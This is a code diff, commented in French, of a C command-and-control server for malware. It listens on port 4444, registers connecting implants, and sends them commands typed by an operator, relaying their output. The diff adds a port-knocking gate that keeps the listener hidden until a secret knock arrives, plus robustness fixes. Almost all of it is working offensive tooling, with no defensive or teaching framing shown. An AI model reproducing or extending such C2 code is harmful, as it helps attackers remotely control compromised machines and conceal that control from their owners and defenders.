@@ -1,9 +1,11 @@
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <pthread.h>
+#include "port_knocking.h"
 
 #define PORT 4444
 #define MAX_CONN 10
@@ -16,12 +18,18 @@ void *handle_client(void *arg) {
 
     printf("[+] Nouveau client connecté\n");
 
-    // Réception de l'enregistrement du malware
-    recv(client_sock, buffer, sizeof(buffer) - 1, 0);
-    buffer[strcspn(buffer, "\n")] = 0;
+    // Réception du message initial du client
+    int bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
+    if (bytes_received <= 0) {
+        printf("[C2] Erreur lors de la réception, fermeture du client.\n");
+        close(client_sock);
+        return NULL;
+    }
+    
+    buffer[bytes_received] = '\0';
     printf("[+] Nouveau malware enregistré : %s\n", buffer);
 
-    // Boucle interactive pour envoyer des commandes
+    // Boucle pour envoyer des commandes au client
     while (1) {
         printf("[C2] Entrez une commande (ou 'exit' pour quitter) : ");
         fflush(stdout);
@@ -35,11 +43,12 @@ void *handle_client(void *arg) {
             break;
         }
 
+        // Envoyer la commande au client
         send(client_sock, buffer, strlen(buffer), 0);
 
-        // Attente de la réponse du client
+        // Recevoir la réponse du client
         memset(buffer, 0, sizeof(buffer));
-        int bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
+        bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
         if (bytes_received <= 0) {
             printf("[C2] Client déconnecté\n");
             break;
@@ -54,16 +63,24 @@ void *handle_client(void *arg) {
 }
 
 int main() {
+    wait_for_knock();
+    
     int server_sock, *new_sock;
     struct sockaddr_in server_addr, client_addr;
     socklen_t addr_size = sizeof(client_addr);
     pthread_t thread_id;
 
+    // Création du socket
     server_sock = socket(AF_INET, SOCK_STREAM, 0);
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = INADDR_ANY;
     server_addr.sin_port = htons(PORT);
 
+    // Éviter "Address already in use" après une fermeture brutale
+    int opt = 1;
+    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+    // Bind et écoute
     bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
     listen(server_sock, MAX_CONN);
 
@@ -74,8 +91,9 @@ int main() {
         *new_sock = accept(server_sock, (struct sockaddr*)&client_addr, &addr_size);
         printf("[+] Connexion d'un malware depuis : %s\n", inet_ntoa(client_addr.sin_addr));
 
+        // Lancer un thread pour gérer le client
         pthread_create(&thread_id, NULL, handle_client, (void*)new_sock);
-        pthread_detach(thread_id);  // Évite les threads zombies
+        pthread_detach(thread_id);
     }
 
     close(server_sock);
